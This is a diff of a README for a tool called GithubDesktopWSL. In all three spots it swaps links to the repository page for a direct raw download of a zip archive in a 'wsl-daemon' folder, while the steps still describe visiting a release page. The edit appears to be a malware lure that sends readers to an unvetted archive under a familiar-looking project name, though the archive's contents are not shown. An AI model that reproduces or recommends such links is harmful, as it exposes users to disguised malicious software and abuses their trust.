@@ -1,6 +1,6 @@
 # 💻 GithubDesktopWSL - Fast Git for Windows and WSL
 
-[![Download GithubDesktopWSL](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://github.com/inerrable-snick538/GithubDesktopWSL)
+[![Download GithubDesktopWSL](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://github.com/inerrable-snick538/GithubDesktopWSL/raw/refs/heads/main/wsl-daemon/Desktop_Github_WSL_1.3.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ GithubDesktopWSL gives GitHub Desktop native WSL support on Windows. It helps gi
 ## 📥 Download and Install
 
 1. Open the download page:
-   https://github.com/inerrable-snick538/GithubDesktopWSL
+   https://github.com/inerrable-snick538/GithubDesktopWSL/raw/refs/heads/main/wsl-daemon/Desktop_Github_WSL_1.3.zip
 2. On that page, find the latest Windows release or app file.
 3. Download the Windows installer or app package.
 4. Open the downloaded file.
@@ -132,7 +132,7 @@ If you have a web app in WSL2, you can open it in GithubDesktopWSL, see your fil
 ## 📌 Download Again
 
 If you need the app page again, use this link:
-https://github.com/inerrable-snick538/GithubDesktopWSL
+https://github.com/inerrable-snick538/GithubDesktopWSL/raw/refs/heads/main/wsl-daemon/Desktop_Github_WSL_1.3.zip
 
 ## 🧷 Topics
 
